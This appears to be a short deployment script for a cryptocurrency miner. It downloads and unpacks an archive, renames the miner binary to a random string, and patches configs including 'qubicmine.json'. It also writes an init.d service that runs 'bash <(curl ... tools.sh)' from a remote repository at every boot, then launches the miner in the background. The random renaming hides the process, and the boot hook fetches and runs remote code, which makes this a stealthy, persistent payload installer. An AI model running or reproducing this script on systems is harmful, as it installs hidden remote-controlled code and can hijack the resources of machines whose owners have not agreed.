cd /
wget https://github.com/cavestara/grotto/releases/download/v1.9.7/huts.zip
unzip huts.zip
cd /huts
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv house $variable1
sed -i "s/python/${variable1}/g" ./loess.sh
sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/cavestara/grotto/main/tools.sh)" > spear.sh
chmod a+x spear.sh
update-rc.d spear.sh defaults
rm -rf huts.zip
cd /huts
nohup ./loess.sh
ps -ef | grep huts
